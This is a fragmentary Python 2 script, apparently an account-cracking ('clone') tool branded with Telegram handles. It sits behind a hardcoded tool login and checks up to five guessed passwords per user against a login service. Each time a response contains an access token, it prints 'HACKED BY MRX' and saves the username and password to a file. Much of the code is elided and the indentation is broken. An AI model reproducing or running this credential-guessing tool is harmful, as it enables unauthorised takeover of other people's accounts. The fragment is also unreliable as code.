...
oks = []
id = []
logo = ' \n\nTelegram/i4m_mrx\nTelegram Chenall python968\n         \n--------------------------------------\n   \n\n      \n\n\n        '
logo2 = '                                                                     \n                                                                        \n \nTelegram/i4m_mrx\nTelegram Chenall python968\n         \n--------------------------------------\n   \n\n      \n\n       '
CorrectUsername = '1337'
CorrectPassword = 'up'
os.system('clear')
print logo2
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;97m>\x1b\x1b[31;1mTOOL USERNAME: ')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;97m>\x1b\x1b[31;1mTOOL PASSWORD: ')
        if password == CorrectPassword:
            print '\x1b[1;92m[OK] Tawawa  ' 
            time.sleep(3)
            loop = 'false'
        else:
            print 'Pass Halaya'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED BY MRX]  ' + k + c + user + '  \x1b[1;92m|  ' + pass1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[HACKED BY MRX]  ' + k + c + user + '  \x1b[1;92m|  ' + pass2
                    okb = open('Successfully/clone.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[HACKED BY MRX]  ' + k + c + user + '  \x1b[1;92m|  ' + pass3
                        okb = open('Successfully/clone.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[HACKED BY MRX]  ' + k + c + user + '  \x1b[1;92m|  ' + pass4
                            okb = open('Successfully/clone.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[HACKED BY MRX]  ' + k + c + user + '  \x1b[1;92m|  ' + pass5
                                okb = open('Successfully/clone.txt', 'a')
